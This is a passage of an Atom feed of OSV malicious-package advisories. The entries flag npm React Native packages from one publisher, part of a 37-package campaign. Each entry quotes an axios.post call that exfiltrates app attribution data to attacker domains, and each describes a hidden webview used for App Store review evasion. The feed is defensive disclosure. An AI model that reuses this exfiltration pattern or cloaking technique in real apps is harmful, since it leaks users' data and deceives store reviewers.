-    <id>https://osv.dev/vulnerability/MAL-2026-6154</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6154"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:50Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in datapersistence-steppers-ai (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;datapersistence-steppers-ai&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `datapersistence-steppers-ai` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;ca…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/datapersistence-steppers-ai"&gt;https://www.npmjs.com/package/datapersistence-steppers-ai&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6154"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6155: Malicious code in designsystem-vector (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6155</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6155"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:50Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in designsystem-vector (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;designsystem-vector&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `designsystem-vector` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://barbellmate.xyz&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27; functio…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/designsystem-vector"&gt;https://www.npmjs.com/package/designsystem-vector&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6155"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6152: Malicious code in custom-save-area-block (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6152</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6152"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:50Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in custom-save-area-block (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;custom-save-area-block&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `custom-save-area-block` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calcula…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/custom-save-area-block"&gt;https://www.npmjs.com/package/custom-save-area-block&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6152"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6151: Malicious code in buildautomation-touch (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6151</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6151"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:50Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in buildautomation-touch (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;buildautomation-touch&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `buildautomation-touch` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://barbellmate.xyz&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27; funct…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/buildautomation-touch"&gt;https://www.npmjs.com/package/buildautomation-touch&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6151"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6153: Malicious code in datapersistence-profiling (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6153</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6153"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:50Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in datapersistence-profiling (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;datapersistence-profiling&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `datapersistence-profiling` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://barbellmate.xyz&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27; f…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/datapersistence-profiling"&gt;https://www.npmjs.com/package/datapersistence-profiling&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6153"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6149: Malicious code in backgroundprocessing-contextmenus (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6149</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6149"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:50Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in backgroundprocessing-contextmenus (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;backgroundprocessing-contextmenus&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `backgroundprocessing-contextmenus` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind ju…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/backgroundprocessing-contextmenus"&gt;https://www.npmjs.com/package/backgroundprocessing-contextmenus&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6149"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6148: Malicious code in async-protobuf-av (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6148</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6148"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:49Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in async-protobuf-av (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;async-protobuf-av&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `async-protobuf-av` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://barbellmate.xyz&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27; functions…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/async-protobuf-av"&gt;https://www.npmjs.com/package/async-protobuf-av&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6148"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6147: Malicious code in analytics-readability-gestures (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6147</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6147"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:49Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in analytics-readability-gestures (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;analytics-readability-gestures&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `analytics-readability-gestures` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/analytics-readability-gestures"&gt;https://www.npmjs.com/package/analytics-readability-gestures&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6147"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6146: Malicious code in actionbars-infinitescroll-searchbar (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6146</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6146"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:49Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in actionbars-infinitescroll-searchbar (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;actionbars-infinitescroll-searchbar&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `actionbars-infinitescroll-searchbar` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/actionbars-infinitescroll-searchbar"&gt;https://www.npmjs.com/package/actionbars-infinitescroll-searchbar&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6146"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6145: Malicious code in accordion-animationtiming-authorization (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6145</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6145"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:49Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in accordion-animationtiming-authorization (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;accordion-animationtiming-authorization&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `accordion-animationtiming-authorization` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://barbellmate.xyz&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/accordion-animationtiming-authorization"&gt;https://www.npmjs.com/package/accordion-animationtiming-authorization&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6145"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6150: Malicious code in barcodescanner-reconnect (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6150</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6150"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in barcodescanner-reconnect (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;barcodescanner-reconnect&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `barcodescanner-reconnect` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calcu…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/barcodescanner-reconnect"&gt;https://www.npmjs.com/package/barcodescanner-reconnect&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6150"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6181: Malicious code in virtualization-compression-collapse (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6181</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6181"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in virtualization-compression-collapse (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;virtualization-compression-collapse&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `virtualization-compression-collapse` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/virtualization-compression-collapse"&gt;https://www.npmjs.com/package/virtualization-compression-collapse&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6181"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6180: Malicious code in userinterface-machinelearning (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6180</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6180"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in userinterface-machinelearning (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;userinterface-machinelearning&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `userinterface-machinelearning` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/userinterface-machinelearning"&gt;https://www.npmjs.com/package/userinterface-machinelearning&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6180"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6179: Malicious code in touchid-images (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6179</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6179"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in touchid-images (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;touchid-images&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `touchid-images` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27; fun…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/touchid-images"&gt;https://www.npmjs.com/package/touchid-images&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6179"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6177: Malicious code in socket-network (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6177</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6177"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in socket-network (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;socket-network&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `socket-network` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27; fun…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/socket-network"&gt;https://www.npmjs.com/package/socket-network&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6177"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6178: Malicious code in streaming-downloads (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6178</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6178"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:48Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in streaming-downloads (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;streaming-downloads&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `streaming-downloads` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://barbellmate.xyz&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27; functio…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/streaming-downloads"&gt;https://www.npmjs.com/package/streaming-downloads&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6178"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6176: Malicious code in request-tracking-sqlite (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6176</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6176"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:48Z</updated>
-    <category term="npm"/>
